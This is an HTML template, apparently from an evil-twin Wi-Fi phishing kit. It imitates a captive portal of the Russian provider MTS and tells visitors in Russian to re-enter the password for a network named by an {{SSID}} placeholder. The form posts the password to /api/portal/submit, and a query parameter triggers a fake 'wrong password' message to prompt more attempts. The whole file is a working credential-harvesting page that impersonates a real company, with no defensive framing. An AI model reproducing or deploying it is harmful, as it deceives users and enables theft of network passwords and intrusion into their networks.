<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>МТС — Домашний интернет</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f5f5f5;font-family:Arial,Helvetica,sans-serif;min-height:100vh}
.hdr{background:#E30611;padding:0 20px;height:54px;display:flex;align-items:center;gap:14px}
.hdr-logo{display:flex;align-items:center;gap:10px}
.logo-circle{width:34px;height:34px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center}
.logo-circle span{color:#E30611;font-size:12px;font-weight:900;letter-spacing:-.5px}
.logo-text{color:#fff;font-size:17px;font-weight:700;letter-spacing:.5px}
.hero{background:#E30611;padding:24px 20px 44px;color:#fff}
.hero h1{font-size:18px;font-weight:700;margin-bottom:6px}
.hero p{font-size:13px;opacity:.9;line-height:1.6}
.hero .ssid{font-weight:700;font-style:italic}
.wrap{max-width:420px;margin:-22px auto 0;padding:0 16px 40px;position:relative}
.card{background:#fff;border-radius:10px;padding:24px;box-shadow:0 4px 16px rgba(0,0,0,.12)}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;color:#666;margin-bottom:5px;font-weight:700;text-transform:uppercase;letter-spacing:.5px}
input[type=text],input[type=password]{width:100%;padding:11px 14px;border:2px solid #e8e8e8;border-radius:8px;font-size:14px;outline:none;-webkit-appearance:none}
input[type=text]:focus,input[type=password]:focus{border-color:#E30611}
input[readonly]{background:#fafafa;color:#888}
.btn{width:100%;padding:14px;background:#E30611;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;margin-top:6px;-webkit-appearance:none;position:relative;letter-spacing:.3px}
.btn:active{background:#b5000d}
.spin{display:none;position:absolute;right:16px;top:50%;transform:translateY(-50%);width:18px;height:18px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
@keyframes sp{to{transform:translateY(-50%) rotate(360deg)}}
.error{display:none;background:#fff0f0;border:1px solid #ffcccc;border-radius:6px;padding:10px;font-size:12px;color:#c0392b;margin-top:10px}
.footer{text-align:center;margin-top:16px;font-size:11px;color:#aaa}
</style>
</head>
<body>
<div class="hdr">
  <div class="hdr-logo">
    <div class="logo-circle"><span>МТС</span></div>
    <div class="logo-text">МТС</div>
  </div>
</div>
<div class="hero">
  <h1>Домашний интернет МТС</h1>
  <p>Требуется повторная авторизация в сети <span class="ssid">{{SSID}}</span>.<br>Введите пароль для восстановления доступа.</p>
</div>
<div class="wrap">
  <div class="card">
    <form method="POST" action="/api/portal/submit" id="frm">
      <input type="hidden" name="ssid" value="{{SSID}}">
      <input type="hidden" name="vendor" value="mts">
      <div class="field">
        <label>Сеть Wi-Fi</label>
        <input type="text" value="{{SSID}}" readonly>
      </div>
      <div class="field">
        <label>Пароль</label>
        <input type="password" name="password" placeholder="Введите пароль сети" required autocomplete="off" minlength="8">
      </div>
      <button type="submit" class="btn" id="sbtn">
        Подключиться
        <div class="spin" id="sp"></div>
      </button>
    </form>
    <div class="error" id="err">Неверный пароль. Попробуйте ещё раз.</div>
  </div>
  <div class="footer">ПАО «МТС» — Домашний интернет и телевидение</div>
</div>
<script>
document.getElementById('frm').addEventListener('submit',function(){
  document.getElementById('sp').style.display='block';
  document.getElementById('sbtn').disabled=true;
});
if(new URLSearchParams(location.search).get('err')){document.getElementById('err').style.display='block';}
</script>
</body>
</html>
